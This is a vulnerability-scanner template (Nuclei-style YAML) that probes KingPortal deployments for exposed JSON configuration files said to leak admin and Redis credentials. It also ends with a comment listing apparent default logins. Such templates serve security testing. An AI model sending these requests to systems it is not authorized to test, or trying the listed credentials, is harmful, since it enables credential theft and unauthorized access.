id: KingPortal-ProjectManager-weak
info:
  name: Template Name
  author: apple
  severity: high
  description: KingPortal开发系统信息泄露后台用户名密码以及redis地址、端口、密码等.
  reference:
    - https://mp.weixin.qq.com/s/fYnLnoeHvYFwaSSKfBjQZw
  tags: tags
http:
  - raw:
      - |+
        GET /ProjectManager.json HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: close
        Upgrade-Insecure-Requests: 1

      - |+
        GET /config/externalConfig.json HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: close
        Upgrade-Insecure-Requests: 1

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - cadtilePath
      - type: word
        part: body
        words:
          - 'projectMng'
#admin001/admin001、admin001/kf_admin